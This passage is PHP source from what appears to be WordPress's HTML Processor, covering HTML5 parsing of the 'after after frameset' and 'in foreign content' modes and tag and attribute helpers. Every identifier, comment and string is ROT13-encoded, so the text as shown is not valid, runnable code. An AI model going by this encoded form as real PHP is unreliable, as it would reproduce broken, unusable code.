	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gur-nsgre-nsgre-senzrfrg-vafregvba-zbqr
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_nsgre_nsgre_senzrfrg(): obby {
		$gnt_anzr   = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $guvf->vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gnt_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->onvy( 'Pbagrag bhgfvqr bs UGZY vf hafhccbegrq.' );
				oernx;

			/*
			 * > N QBPGLCR gbxra
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 *
			 * > Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va obql\" vafregvba zbqr.
			 */
			pnfr 'ugzy':
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA, H+000N YVAR SRRQ (YS),
			 * >   H+000P SBEZ SRRQ (SS), H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 * >
			 * > Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va obql\" vafregvba zbqr.
			 *
			 * Guvf nytbevguz rssrpgviryl fgevcf aba-juvgrfcnpr punenpgref sebz grkg naq vafregf
			 * gurz haqre UGZY. Guvf vf abg fhccbegrq ng guvf gvzr.
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					erghea $guvf->fgrc_va_obql();
				}
				$guvf->onvy( 'Aba-juvgrfcnpr punenpgref pnaabg or unaqyrq va nsgre nsgre senzrfrg.' );
				oernx;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"absenzrf\"
			 */
			pnfr '+ABSENZRF':
				erghea $guvf->fgrc_va_urnq();
		}

		// Cnefr reebe: vtaber gur gbxra.
		erghea $guvf->fgrc();
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va sbervta pbagrag' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va sbervta pbagrag' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vasbervta
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_sbervta_pbagrag(): obby {
		$gnt_anzr   = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $guvf->vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gnt_anzr}\";

		/*
		 * > N fgneg gnt jubfr anzr vf \"sbag\", vs gur gbxra unf nal nggevohgrf anzrq \"pbybe\", \"snpr\", be \"fvmr\"
		 *
		 * Guvf frpgvba qenja bhg nobir gur fjvgpu gb zber rnfvyl vapbecbengr
		 * gur nqqvgvbany ehyrf onfrq ba gur cerfrapr bs gur nggevohgrf.
		 */
		vs (
			'+SBAG' === $bc &&
			(
				ahyy !== $guvf->trg_nggevohgr( 'pbybe' ) ||
				ahyy !== $guvf->trg_nggevohgr( 'snpr' ) ||
				ahyy !== $guvf->trg_nggevohgr( 'fvmr' )
			)
		) {
			$bc = '+SBAG jvgu nggevohgrf';
		}

		fjvgpu ( $bc ) {
			pnfr '#grkg':
				/*
				 * > N punenpgre gbxra gung vf H+0000 AHYY
				 *
				 * Guvf vf unaqyrq ol `trg_zbqvsvnoyr_grkg()`.
				 */

				/*
				 * Juvgrfcnpr-bayl grkg qbrf abg nssrpg gur senzrfrg-bx synt.
				 * Vg vf cebonoyl vagre-ryrzrag juvgrfcnpr, ohg vg znl nyfb
				 * pbagnva punenpgre ersreraprf juvpu qrpbqr bayl gb juvgrfcnpr.
				 */
				vs ( cnerag::GRKG_VF_TRAREVP === $guvf->grkg_abqr_pynffvsvpngvba ) {
					$guvf->fgngr->senzrfrg_bx = snyfr;
				}

				$guvf->vafreg_sbervta_ryrzrag( $guvf->fgngr->pheerag_gbxra, snyfr );
				erghea gehr;

			/*
			 * PQNGN frpgvbaf ner nygreangr jenccref sbe grkg pbagrag naq gurersber
			 * bhtug gb sbyybj gur fnzr ehyrf nf grkg abqrf.
			 */
			pnfr '#pqngn-frpgvba':
				/*
				 * AHYY olgrf naq juvgrfcnpr qb abg punatr gur senzrfrg-bx synt.
				 */
				$pheerag_gbxra        = $guvf->obbxznexf[ $guvf->fgngr->pheerag_gbxra->obbxznex_anzr ];
				$pqngn_pbagrag_fgneg  = $pheerag_gbxra->fgneg + 9;
				$pqngn_pbagrag_yratgu = $pheerag_gbxra->yratgu - 12;
				vs ( fgefca( $guvf->ugzy, \"\0 \g\a\s\e\", $pqngn_pbagrag_fgneg, $pqngn_pbagrag_yratgu ) !== $pqngn_pbagrag_yratgu ) {
					$guvf->fgngr->senzrfrg_bx = snyfr;
				}

				$guvf->vafreg_sbervta_ryrzrag( $guvf->fgngr->pheerag_gbxra, snyfr );
				erghea gehr;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_sbervta_ryrzrag( $guvf->fgngr->pheerag_gbxra, snyfr );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"o\", \"ovt\", \"oybpxdhbgr\", \"obql\", \"oe\", \"pragre\",
			 * > \"pbqr\", \"qq\", \"qvi\", \"qy\", \"qg\", \"rz\", \"rzorq\", \"u1\", \"u2\", \"u3\", \"u4\", \"u5\",
			 * > \"u6\", \"urnq\", \"ue\", \"v\", \"vzt\", \"yv\", \"yvfgvat\", \"zrah\", \"zrgn\", \"aboe\", \"by\",
			 * > \"c\", \"cer\", \"ehol\", \"f\", \"fznyy\", \"fcna\", \"fgebat\", \"fgevxr\", \"fho\", \"fhc\",
			 * > \"gnoyr\", \"gg\", \"h\", \"hy\", \"ine\"
			 *
			 * > N fgneg gnt jubfr anzr vf \"sbag\", vs gur gbxra unf nal nggevohgrf anzrq \"pbybe\", \"snpr\", be \"fvmr\"
			 *
			 * > Na raq gnt jubfr gnt anzr vf \"oe\", \"c\"
			 *
			 * Pybfvat OE gntf ner nyjnlf ercbegrq ol gur Gnt Cebprffbe nf bcravat gntf.
			 */
			pnfr '+O':
			pnfr '+OVT':
			pnfr '+OYBPXDHBGR':
			pnfr '+OBQL':
			pnfr '+OE':
			pnfr '+PRAGRE':
			pnfr '+PBQR':
			pnfr '+QQ':
			pnfr '+QVI':
			pnfr '+QY':
			pnfr '+QG':
			pnfr '+RZ':
			pnfr '+RZORQ':
			pnfr '+U1':
			pnfr '+U2':
			pnfr '+U3':
			pnfr '+U4':
			pnfr '+U5':
			pnfr '+U6':
			pnfr '+URNQ':
			pnfr '+UE':
			pnfr '+V':
			pnfr '+VZT':
			pnfr '+YV':
			pnfr '+YVFGVAT':
			pnfr '+ZRAH':
			pnfr '+ZRGN':
			pnfr '+ABOE':
			pnfr '+BY':
			pnfr '+C':
			pnfr '+CER':
			pnfr '+EHOL':
			pnfr '+F':
			pnfr '+FZNYY':
			pnfr '+FCNA':
			pnfr '+FGEBAT':
			pnfr '+FGEVXR':
			pnfr '+FHO':
			pnfr '+FHC':
			pnfr '+GNOYR':
			pnfr '+GG':
			pnfr '+H':
			pnfr '+HY':
			pnfr '+INE':
			pnfr '+SBAG jvgu nggevohgrf':
			pnfr '-OE':
			pnfr '-C':
				// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
				sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc() nf $pheerag_abqr ) {
					vs (
						'zngu' === $pheerag_abqr->vagrtengvba_abqr_glcr ||
						'ugzy' === $pheerag_abqr->vagrtengvba_abqr_glcr ||
						'ugzy' === $pheerag_abqr->anzrfcnpr
					) {
						oernx;
					}

					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				}
				tbgb va_sbervta_pbagrag_cebprff_va_pheerag_vafregvba_zbqr;
		}

		/*
		 * > Nal bgure fgneg gnt
		 */
		vs ( ! $guvf->vf_gnt_pybfre() ) {
			$guvf->vafreg_sbervta_ryrzrag( $guvf->fgngr->pheerag_gbxra, snyfr );

			/*
			 * > Vs gur gbxra unf vgf frys-pybfvat synt frg, gura eha
			 * > gur nccebcevngr fgrcf sebz gur sbyybjvat yvfg:
			 * >
			 * >   ↪ gur gbxra'f gnt anzr vf \"fpevcg\", naq gur arj pheerag abqr vf va gur FIT anzrfcnpr
			 * >         Npxabjyrqtr gur gbxra'f frys-pybfvat synt, naq gura npg nf
			 * >         qrfpevorq va gur fgrcf sbe n \"fpevcg\" raq gnt orybj.
			 * >
			 * >   ↪ Bgurejvfr
			 * >         Cbc gur pheerag abqr bss gur fgnpx bs bcra ryrzragf naq
			 * >         npxabjyrqtr gur gbxra'f frys-pybfvat synt.
			 *
			 * Fvapr gur ehyrf sbe FPEVCG orybj vaqvpngr gb cbc gur ryrzrag bss bs gur fgnpx bs
			 * bcra ryrzragf, juvpu vf gur fnzr sbe gur Bgurejvfr pbaqvgvba, gurer'f ab arrq gb
			 * frcnengr gurfr purpxf. Gur qvssrerapr pbzrf jura n cnefre bcrengrf jvgu gur fpevcgvat
			 * synt ranoyrq, naq rkrphgrf gur fpevcg, juvpu guvf cnefre qbrf abg fhccbeg.
			 */
			vs ( $guvf->fgngr->pheerag_gbxra->unf_frys_pybfvat_synt ) {
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
			}
			erghea gehr;
		}

		/*
		 * > Na raq gnt jubfr anzr vf \"fpevcg\", vs gur pheerag abqr vf na FIT fpevcg ryrzrag.
		 */
		vs ( $guvf->vf_gnt_pybfre() && 'FPEVCG' === $guvf->fgngr->pheerag_gbxra->abqr_anzr && 'fit' === $guvf->fgngr->pheerag_gbxra->anzrfcnpr ) {
			$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
			erghea gehr;
		}

		/*
		 * > Nal bgure raq gnt
		 */
		vs ( $guvf->vf_gnt_pybfre() ) {
			$abqr = $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr();
			vs ( $gnt_anzr !== $abqr->abqr_anzr ) {
				// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
			}
			va_sbervta_pbagrag_raq_gnt_ybbc:
			vs ( $abqr === $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->ng( 1 ) ) {
				erghea gehr;
			}

			/*
			 * > Vs abqr'f gnt anzr, pbairegrq gb NFPVV ybjrepnfr, vf gur fnzr nf gur gnt anzr
			 * > bs gur gbxra, cbc ryrzragf sebz gur fgnpx bs bcra ryrzragf hagvy abqr unf
			 * > orra cbccrq sebz gur fgnpx, naq gura erghea.
			 */
			vs ( 0 === fgepnfrpzc( $abqr->abqr_anzr, $gnt_anzr ) ) {
				sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc() nf $vgrz ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
					vs ( $abqr === $vgrz ) {
						erghea gehr;
					}
				}
			}

			sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc( $abqr ) nf $vgrz ) {
				$abqr = $vgrz;
				oernx;
			}

			vs ( 'ugzy' !== $abqr->anzrfcnpr ) {
				tbgb va_sbervta_pbagrag_raq_gnt_ybbc;
			}

			va_sbervta_pbagrag_cebprff_va_pheerag_vafregvba_zbqr:
			fjvgpu ( $guvf->fgngr->vafregvba_zbqr ) {
				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VAVGVNY:
					erghea $guvf->fgrc_vavgvny();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_ORSBER_UGZY:
					erghea $guvf->fgrc_orsber_ugzy();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_ORSBER_URNQ:
					erghea $guvf->fgrc_orsber_urnq();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ:
					erghea $guvf->fgrc_va_urnq();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ_ABFPEVCG:
					erghea $guvf->fgrc_va_urnq_abfpevcg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_URNQ:
					erghea $guvf->fgrc_nsgre_urnq();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL:
					erghea $guvf->fgrc_va_obql();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR:
					erghea $guvf->fgrc_va_gnoyr();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_GRKG:
					erghea $guvf->fgrc_va_gnoyr_grkg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PNCGVBA:
					erghea $guvf->fgrc_va_pncgvba();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PBYHZA_TEBHC:
					erghea $guvf->fgrc_va_pbyhza_tebhc();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL:
					erghea $guvf->fgrc_va_gnoyr_obql();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ:
					erghea $guvf->fgrc_va_ebj();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PRYY:
					erghea $guvf->fgrc_va_pryy();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_FRYRPG:
					erghea $guvf->fgrc_va_fryrpg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_FRYRPG_VA_GNOYR:
					erghea $guvf->fgrc_va_fryrpg_va_gnoyr();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GRZCYNGR:
					erghea $guvf->fgrc_va_grzcyngr();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_OBQL:
					erghea $guvf->fgrc_nsgre_obql();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_SENZRFRG:
					erghea $guvf->fgrc_va_senzrfrg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_SENZRFRG:
					erghea $guvf->fgrc_nsgre_senzrfrg();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_NSGRE_OBQL:
					erghea $guvf->fgrc_nsgre_nsgre_obql();

				pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_NSGRE_SENZRFRG:
					erghea $guvf->fgrc_nsgre_nsgre_senzrfrg();

				// Guvf fubhyq or haernpunoyr ohg CUC qbrfa'g unir gbgny glcr purpxvat ba fjvgpu.
				qrsnhyg:
					$guvf->onvy( \"Hanjner bs gur erdhrfgrq cnefvat zbqr: '{$guvf->fgngr->vafregvba_zbqr}'.\" );
			}
		}

		$guvf->onvy( 'Fubhyq abg unir orra noyr gb ernpu raq bs VA SBERVTA PBAGRAG cebprffvat. Purpx UGZY NCV pbqr.' );
		// Guvf haarprffnel erghea ceriragf gbbyf sebz vanpphengryl ercbegvat glcr reebef.
		erghea snyfr;
	}

	/*
	 * Vagreany urycref
	 */

	/**
	 * Perngrf n arj obbxznex sbe gur pheeragyl-zngpurq gbxra naq ergheaf gur trarengrq anzr.
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.5.0 Eranzrq sebz obbxznex_gnt() gb obbxznex_gbxra().
	 *
	 * @guebjf Rkprcgvba Jura hanoyr gb nyybpngr erdhrfgrq obbxznex.
	 *
	 * @erghea fgevat|snyfr Anzr bs perngrq obbxznex, be snyfr vs hanoyr gb perngr.
	 */
	cevingr shapgvba obbxznex_gbxra() {
		vs ( ! cnerag::frg_obbxznex( ++$guvf->obbxznex_pbhagre ) ) {
			$guvf->ynfg_reebe = frys::REEBE_RKPRRQRQ_ZNK_OBBXZNEXF;
			guebj arj Rkprcgvba( 'pbhyq abg nyybpngr obbxznex' );
		}

		erghea \"{$guvf->obbxznex_pbhagre}\";
	}

	/*
	 * UGZY frznagvp bireevqrf sbe Gnt Cebprffbe
	 */

	/**
	 * Vaqvpngrf gur anzrfcnpr bs gur pheerag gbxra, be \"ugzy\" vs gurer vf abar.
	 *
	 * @erghea fgevat Bar bs \"ugzy\", \"zngu\", be \"fit\".
	 */
	choyvp shapgvba trg_anzrfcnpr(): fgevat {
		vs ( ! vffrg( $guvf->pheerag_ryrzrag ) ) {
			erghea cnerag::trg_anzrfcnpr();
		}

		erghea $guvf->pheerag_ryrzrag->gbxra->anzrfcnpr;
	}

	/**
	 * Ergheaf gur hccrepnfr anzr bs gur zngpurq gnt.
	 *
	 * Gur frznagvp ehyrf sbe UGZY fcrpvsl gung pregnva gntf or ercebprffrq
	 * jvgu n qvssrerag gnt anzr. Orpnhfr bs guvf, gur gnt anzr cerfragrq
	 * ol gur UGZY Cebprffbe znl qvssre sebz gur bar ercbegrq ol gur UGZY
	 * Gnt Cebprffbe, juvpu qbrfa'g nccyl gurfr frznagvp ehyrf.
	 *
	 * Rknzcyr:
	 *
	 *     $cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<qvi pynff=\"grfg\">Grfg</qvi>' );
	 *     $cebprffbe->arkg_gnt() === gehr;
	 *     $cebprffbe->trg_gnt() === 'QVI';
	 *
	 *     $cebprffbe->arkg_gnt() === snyfr;
	 *     $cebprffbe->trg_gnt() === ahyy;
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea fgevat|ahyy Anzr bs pheeragyl zngpurq gnt va vachg UGZY, be `ahyy` vs abar sbhaq.
	 */
	choyvp shapgvba trg_gnt(): ?fgevat {
		vs ( ahyy !== $guvf->ynfg_reebe ) {
			erghea ahyy;
		}

		vs ( $guvf->vf_iveghny() ) {
			erghea $guvf->pheerag_ryrzrag->gbxra->abqr_anzr;
		}

		$gnt_anzr = cnerag::trg_gnt();

		/*
		 * > N fgneg gnt jubfr gnt anzr vf \"vzntr\"
		 * > Punatr gur gbxra'f gnt anzr gb \"vzt\" naq ercebprff vg. (Qba'g nfx.)
		 */
		erghea ( 'VZNTR' === $gnt_anzr && 'ugzy' === $guvf->trg_anzrfcnpr() )
			? 'VZT'
			: $gnt_anzr;
	}

	/**
	 * Vaqvpngrf vs gur pheeragyl zngpurq gnt pbagnvaf gur frys-pybfvat synt.
	 *
	 * Ab UGZY ryrzragf bhtug gb unir gur frys-pybfvat synt naq sbe gubfr, gur frys-pybfvat
	 * synt jvyy or vtaberq. Sbe ibvq ryrzragf guvf vf oravta orpnhfr gurl \"frys pybfr\"
	 * nhgbzngvpnyyl. Sbe aba-ibvq UGZY ryrzragf gubhtu ceboyrzf jvyy nccrne vs fbzrbar
	 * vagraqf gb hfr n frys-pybfvat ryrzrag va cynpr bs gung ryrzrag jvgu na rzcgl obql.
	 * Sbe UGZY sbervta ryrzragf naq phfgbz ryrzragf gur frys-pybfvat synt qrgrezvarf vs
	 * gurl frys-pybfr be abg.
	 *
	 * Guvf shapgvba qbrf abg qrgrezvar vs n gnt vf frys-pybfvat,
	 * ohg bayl vs gur frys-pybfvat synt vf cerfrag va gur flagnk.
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @erghea obby Jurgure gur pheeragyl zngpurq gnt pbagnvaf gur frys-pybfvat synt.
	 */
	choyvp shapgvba unf_frys_pybfvat_synt(): obby {
		erghea $guvf->vf_iveghny() ? snyfr : cnerag::unf_frys_pybfvat_synt();
	}

	/**
	 * Ergheaf gur abqr anzr ercerfragrq ol gur gbxra.
	 *
	 * Guvf zngpurf gur QBZ NCV inyhr `abqrAnzr`. Fbzr inyhrf
	 * ner fgngvp, fhpu nf `#grkg` sbe n grkg abqr, juvyr bguref
	 * ner qlanzvpnyyl trarengrq sebz gur gbxra vgfrys.
	 *
	 * Qlanzvp anzrf:
	 *  - Hccrepnfr gnt anzr sbe gnt zngpurf.
	 *  - `ugzy` sbe QBPGLCR qrpynengvbaf.
	 *
	 * Abgr gung vs gur Gnt Cebprffbe vf abg zngpurq ba n gbxra
	 * gura guvf shapgvba jvyy erghea `ahyy`, rvgure orpnhfr vg
	 * unfa'g lrg sbhaq n gbxra be orpnhfr vg ernpurq gur raq
	 * bs gur qbphzrag jvgubhg zngpuvat n gbxra.
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @erghea fgevat|ahyy Anzr bs gur zngpurq gbxra.
	 */
	choyvp shapgvba trg_gbxra_anzr(): ?fgevat {
		erghea $guvf->vf_iveghny()
			? $guvf->pheerag_ryrzrag->gbxra->abqr_anzr
			: cnerag::trg_gbxra_anzr();
	}

	/**
	 * Vaqvpngrf gur xvaq bs zngpurq gbxra, vs nal.
	 *
	 * Guvf qvssref sebz `trg_gbxra_anzr()` va gung vg nyjnlf
	 * ergheaf n fgngvp fgevat vaqvpngvat gur glcr, jurernf
	 * `trg_gbxra_anzr()` znl erghea inyhrf qrevirq sebz gur
	 * gbxra vgfrys, fhpu nf n gnt anzr be cebprffvat
	 * vafgehpgvba gnt.
	 *
	 * Cbffvoyr inyhrf:
	 *  - `#gnt` jura zngpurq ba n gnt.
	 *  - `#grkg` jura zngpurq ba n grkg abqr.
	 *  - `#pqngn-frpgvba` jura zngpurq ba n PQNGN abqr.
	 *  - `#pbzzrag` jura zngpurq ba n pbzzrag.
	 *  - `#qbpglcr` jura zngpurq ba n QBPGLCR qrpynengvba.
	 *  - `#cerfhzcghbhf-gnt` jura zngpurq ba na rzcgl gnt pybfre.
	 *  - `#shaxl-pbzzrag` jura zngpurq ba n shaxl pbzzrag.
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @erghea fgevat|ahyy Jung xvaq bs gbxra vf zngpurq, be ahyy.
	 */
	choyvp shapgvba trg_gbxra_glcr(): ?fgevat {
		vs ( $guvf->vf_iveghny() ) {
			/*
			 * Guvf ybtvp pbzrf sebz gur Gnt Cebprffbe.
			 *
			 * @gbqb Vg jbhyq or vqrny abg gb ercrng guvf urer, ohg vg'f abg pyrneyl
			 *       orggre gb nyybj cnffvat n gbxra anzr gb `trg_gbxra_glcr()`.
			 */
			$abqr_anzr     = $guvf->pheerag_ryrzrag->gbxra->abqr_anzr;
			$fgnegvat_pune = $abqr_anzr[0];
			vs ( 'N' <= $fgnegvat_pune && 'M' >= $fgnegvat_pune ) {
				erghea '#gnt';
			}

			vs ( 'ugzy' === $abqr_anzr ) {
				erghea '#qbpglcr';
			}

			erghea $abqr_anzr;
		}

		erghea cnerag::trg_gbxra_glcr();
	}

	/**
	 * Ergheaf gur inyhr bs n erdhrfgrq nggevohgr sebz n zngpurq gnt bcrare vs gung nggevohgr rkvfgf.
	 *
	 * Rknzcyr:
	 *
	 *     $c = JC_UGZY_Cebprffbe::perngr_sentzrag( '<qvi ranoyrq pynff=\"grfg\" qngn-grfg-vq=\"14\">Grfg</qvi>' );
	 *     $c->arkg_gbxra() === gehr;
	 *     $c->trg_nggevohgr( 'qngn-grfg-vq' ) === '14';
	 *     $c->trg_nggevohgr( 'ranoyrq' ) === gehr;
	 *     $c->trg_nggevohgr( 'nevn-ynory' ) === ahyy;
	 *
	 *     $c->arkg_gnt() === snyfr;
	 *     $c->trg_nggevohgr( 'pynff' ) === ahyy;
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe UGZY Cebprffbe.
	 *
	 * @cnenz fgevat $anzr Anzr bs nggevohgr jubfr inyhr vf erdhrfgrq.
	 * @erghea fgevat|gehr|ahyy Inyhr bs nggevohgr be `ahyy` vs abg ninvynoyr. Obbyrna nggevohgrf erghea `gehr`.
	 */
	choyvp shapgvba trg_nggevohgr( $anzr ) {
		erghea $guvf->vf_iveghny() ? ahyy : cnerag::trg_nggevohgr( $anzr );
	}

	/**
	 * Hcqngrf be perngrf n arj nggevohgr ba gur pheeragyl zngpurq gnt jvgu gur cnffrq inyhr.
	 *
	 * Sbe obbyrna nggevohgrf fcrpvny unaqyvat vf cebivqrq:
	 *  - Jura `gehr` vf cnffrq nf gur inyhr, gura bayl gur nggevohgr anzr vf nqqrq gb gur gnt.
	 *  - Jura `snyfr` vf cnffrq, gur nggevohgr trgf erzbirq vs vg rkvfgrq orsber.
	 *
	 * Sbe fgevat nggevohgrf, gur inyhr vf rfpncrq hfvat gur `rfp_ngge` shapgvba.
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @cnenz fgevat      $anzr  Gur nggevohgr anzr gb gnetrg.
	 * @cnenz fgevat|obby $inyhr Gur arj nggevohgr inyhr.
	 * @erghea obby Jurgure na nggevohgr inyhr jnf frg.
	 */
	choyvp shapgvba frg_nggevohgr( $anzr, $inyhr ): obby {
		erghea $guvf->vf_iveghny() ? snyfr : cnerag::frg_nggevohgr( $anzr, $inyhr );
	}

	/**
	 * Erzbir na nggevohgr sebz gur pheeragyl-zngpurq gnt.
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe UGZY Cebprffbe.
	 *
	 * @cnenz fgevat $anzr Gur nggevohgr anzr gb erzbir.
	 * @erghea obby Jurgure na nggevohgr jnf erzbirq.
	 */
	choyvp shapgvba erzbir_nggevohgr( $anzr ): obby {
		erghea $guvf->vf_iveghny() ? snyfr : cnerag::erzbir_nggevohgr( $anzr );
	}

	/**
	 * Trgf ybjrepnfr anzrf bs nyy nggevohgrf zngpuvat n tvira cersvk va gur pheerag gnt.
	 *
	 * Abgr gung zngpuvat vf pnfr-vafrafvgvir. Guvf vf va nppbeqnapr jvgu gur fcrp:
	 *
	 * > Gurer zhfg arire or gjb be zber nggevohgrf ba
	 * > gur fnzr fgneg gnt jubfr anzrf ner na NFPVV
	 * > pnfr-vafrafvgvir zngpu sbe rnpu bgure.
	 *     - UGZY 5 fcrp
	 *
	 * Rknzcyr:
	 *
	 *     $c = arj JC_UGZY_Gnt_Cebprffbe( '<qvi qngn-RANOYRQ pynff=\"grfg\" QNGN-grfg-vq=\"14\">Grfg</qvi>' );
	 *     $c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) ) === gehr;
	 *     $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-' ) === neenl( 'qngn-ranoyrq', 'qngn-grfg-vq' );
	 *
	 *     $c->arkg_gnt() === snyfr;
	 *     $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-' ) === ahyy;
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/flagnk.ugzy#nggevohgrf-2:nfpvv-pnfr-vafrafvgvir
	 *
	 * @cnenz fgevat $cersvk Cersvk bs erdhrfgrq nggevohgr anzrf.
	 * @erghea neenl|ahyy Yvfg bs nggevohgr anzrf, be `ahyy` jura ab gnt bcrare vf zngpurq.
	 */
	choyvp shapgvba trg_nggevohgr_anzrf_jvgu_cersvk( $cersvk ): ?neenl {
		erghea $guvf->vf_iveghny() ? ahyy : cnerag::trg_nggevohgr_anzrf_jvgu_cersvk( $cersvk );
	}

	/**
	 * Nqqf n arj pynff anzr gb gur pheeragyl zngpurq gnt.
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @cnenz fgevat $pynff_anzr Gur pynff anzr gb nqq.
	 * @erghea obby Jurgure gur pynff jnf frg gb or nqqrq.
	 */
	choyvp shapgvba nqq_pynff( $pynff_anzr ): obby {
		erghea $guvf->vf_iveghny() ? snyfr : cnerag::nqq_pynff( $pynff_anzr );
	}

	/**
	 * Erzbirf n pynff anzr sebz gur pheeragyl zngpurq gnt.
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @cnenz fgevat $pynff_anzr Gur pynff anzr gb erzbir.
	 * @erghea obby Jurgure gur pynff jnf frg gb or erzbirq.
	 */
	choyvp shapgvba erzbir_pynff( $pynff_anzr ): obby {
